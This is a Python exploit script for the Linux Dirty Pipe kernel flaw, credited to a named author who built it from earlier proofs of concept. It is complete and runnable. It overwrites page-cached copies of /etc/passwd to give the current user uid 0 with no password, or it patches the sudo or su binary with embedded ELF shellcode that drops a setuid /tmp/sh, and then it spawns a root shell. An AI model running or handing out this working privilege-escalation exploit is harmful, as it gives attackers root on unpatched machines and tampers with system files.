################################################################################
# Author:       Marc Bohler - https://github.com/crusoe112                     #
#                                                                              #
# Description:  Uses Dirty Pipe vulnerability to pop a root shell using Python #
#                                                                              #
# Credits:      This code basically combines 2 existing poc's for dirty pipe:  #
#                 https://github.com/febinrev/dirtypipez-exploit               #
#                 https://github.com/eremus-dev/Dirty-Pipe-sudo-poc            #
#               Those projects, in turn, borrowed directly from the OG:        #
#                 Max Kellermann max.kellermann@ionos.com                      #
#                 https://dirtypipe.cm4all.com/                                #
#                                                                              #
# Usage:        python dirty.py                                                #
#                                                                              #
# Requirements: Requires python > 3.10 because of os.splice                    #
#                                                                              #
# Notes:        This exploit will overwrite a page of the file that resides in #
#               the page cache. It is unlikely to corrupt the actual file. If  #
#               there is corruption or an error, you likely just need to wait  #
#               until the page is overwritten, or restart your computer to fix #
#               any problems.                                                  #
#               That being said, I bear no responsibility for damage done by   #
#               this code, so please read carefully and hack responsibly.      #
#               Be sure to check out Max Kellerman's writeup at cm4all.com as  #
#               well.                                                          #
################################################################################

import argparse
import sys
import pty
import os
import getpass
import subprocess
import platform
from os.path import exists

# Kernel page size
PAGE = 4096
# Linux pipe buffers are 64K
PIPESIZE = 65536

###########################################################
# Small (linux x86_64) ELF file matroshka doll that does: #
#   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);   #
#   write(fd, elfcode, elfcode_len)                       #
#   chmod("/tmp/sh", 04755)                               #
#   close(fd);                                            #
#   exit(0);                                              #
#                                                         #
# The dropped ELF simply does:                            #
#   setuid(0);                                            #
#   setgid(0);                                            #
#   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);         #
#                                                         #
# Credit: https://github.com/febinrev/dirtypipez-exploit  #
###########################################################
elfcode = [
        0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 
        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 
        0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02, 0x00, 0x00, 
        0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 
        0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xba, 0x00, 
        0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 
        0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1c, 
        0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00, 0x48, 0xc7, 
        0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 
        0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 
        0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 
        0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00, 
        0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00, 
        0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00, 0x6a, 0x00, 
        0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 
        0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 
        0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
]


def backup_file(path, backup_path):
    """Back up just for working on the POC"""
    with open(path, 'rb') as orig_file:
        with open(backup_path, 'wb') as backup:
            data = orig_file.read()
            backup.write(data)


def prepare_pipe(read: int, write: int) -> None:
    """ Contaminate the pipe flags by filling and draining """
    data = b'a' * PIPESIZE

    written = os.write(write, data)
    print(f'[*] {written} bytes written to pipe')

    data = os.read(read, PIPESIZE)
    print(f'[*] {len(data)} bytes read from pipe')


def run_poc(data: bytes, path: str, file_offset: int) -> None:
    """ Open target file, contaminate the pipe buff, call splice, write into target file """
    print(f'[*] Opening {path}')
    target_file = os.open(path, os.O_RDONLY)

    print('[*] Opening PIPE')
    r, w = os.pipe()

    print('[*] Contaminating PIPE_BUF_CAN_MERGE flags')
    prepare_pipe(r, w)

    print(f'[*] Splicing byte from {path} to pipe')
    n = os.splice(
        target_file,
        w,
        1,
        offset_src=file_offset
    )

    print(f'[*] Spliced {n} bytes')

    print(f'[*] Altering {path}')
    n = os.write(w, data)

    print(f'[*] {n} bytes written to {path}')


def find_offset_of_user_in_passwd(user):
    file_offset = 0
    to_write = ''
    
    with open('/etc/passwd', 'r') as passwd:
        for line in passwd.readlines():
            if not user in line:
                file_offset += len(line)
            else:
                fields = line.split(':')
                file_offset += len(':'.join(fields[:1]))
                original = ':'.join(fields[1:]) # Save original for recovering
                to_write = ':0:' + ':'.join(fields[3:]) # Set no passwd and uid 0

                # Pad end of line with new line chars so we don't error
                length_diff = len(original) - len(to_write)
                if length_diff > 0:
                    to_write = to_write[:-1] + ('\n' * length_diff) + '\n'

                return file_offset, to_write, original

    return False

def within_page_bounds(file_offset, data_len):
    # Ensure that we are not at a page boundary
    if file_offset % PAGE == 0:
        print(f'[x] Cannot exploit start of page boundary with offset {file_offset}')
        print('[x] Do you have access to another user?')
        print('[x] Remember to clean up /tmp/backup_file')
        return False
    if (file_offset | PAGE) < (file_offset + data_len):
        print(f'[x] Cannot perform exploit across page boundary with offset {file_offset}')
        print('[x] Do you have access to another user?')
        print(f'[x] Remember to clean up {backup_path}')
        return False
    return True

def check_etc_passwd():
    # Check if /etc/passwd exists
    if not exists('/etc/passwd'):
        return False

    # Check if current user has login
    user = getpass.getuser()
    offset_data = find_offset_of_user_in_passwd(user)
    if not offset_data:
        return False

    # Check if on boundary
    if not within_page_bounds(offset_data[0], len(offset_data[1])):
        return False

    return True


def which(cmd):
    return subprocess.getoutput(f'which {cmd}').strip()


def check_elf(cmd):
    sudo_path = which(cmd)
    if not exists(sudo_path):
        return False

    # Check if x86_64
    if not platform.architecture(sudo_path) == ('64bit', 'ELF'):
        return False

    if not within_page_bounds(1, len(elfcode)):
        return False

    return True

def run_elf(binary_name):
    # Backup file
    binary_path = which(binary_name)
    backup_path = f'/tmp/{binary_name}'
    print(f'[*] Backing up {binary_path} to {backup_path}')
    backup_file(binary_path, backup_path)

    # Set offset
    file_offset = 1

    # Save original
    print(f'[*] Saving original state of {binary_path}')
    with open(binary_path, 'rb') as binary:
        orig_data = binary.read(len(elfcode) + 2)[2:]

    # Exploit
    print(f'[*] Hijacking {binary_path}')
    run_poc(bytes(elfcode), binary_path, file_offset)

    # Run modified binary
    print(f'[*] Executing modified {binary_path}')
    os.system(binary_path)

    # Restore state
    print(f'[*] Restoring {binary_path}')
    run_poc(orig_data, binary_path, file_offset)

    # Pop a shell
    print(f'[*] Popping root shell...')
    print()
    pty.spawn('/tmp/sh') 
    print()

    # Cleanup
    print(f'[*] Remember to cleanup {backup_path} and /tmp/sh')
    print(f'[*]   rm {backup_path}')
    print('[*]   rm /tmp/sh')


def run_etc_passwd():
    # Backup file
    backup_path = '/tmp/passwd'
    target_file = '/etc/passwd'
    print(f'[*] Backing up {target_file} to {backup_path}')
    backup_file(target_file, backup_path)

    # Get offset
    user = getpass.getuser()
    print(f'[*] Calculating offset of {user} in {target_file}')

    (file_offset, 
     data_to_write, 
     original) = find_offset_of_user_in_passwd(user)

    # Exploit
    print(f'[*] Hijacking {target_file}') 
    run_poc(bytes(data_to_write, 'utf-8'), target_file, file_offset)

    # Pop a shell
    print(f'[*] Popping root shell...')
    print()
    pty.spawn(['su', user]) 
    print()

    print(f'[*] Restoring {target_file}')
    run_poc(bytes(original, 'utf-8'), target_file, file_offset)

    print(f'[*] Remember to cleanup {backup_path}')
    print(f'[*]   rm {backup_path}')

def main():
    parser = argparse.ArgumentParser(description='Use dirty pipe vulnerability to pop root shell')
    args = parser.parse_args()

    print(f'[*] Attempting to modify /etc/passwd') 
    if check_etc_passwd():
        run_etc_passwd()
        sys.exit()
    print(f'[X] Cannot modify /etc/passwd') 

    print(f'[*] Attempting to modify sudo binary') 
    if check_elf('sudo'):
        run_elf('sudo')
        sys.exit()
    print(f'[X] Cannot modify sudo binary') 

    print(f'[*] Attempting to modify su binary') 
    if check_elf('su'):
        run_elf('su')
        sys.exit()
    print(f'[X] Cannot modify su binary') 

    print(f'[X] Exploit could not be executed!') 


if __name__ == '__main__':
    main()
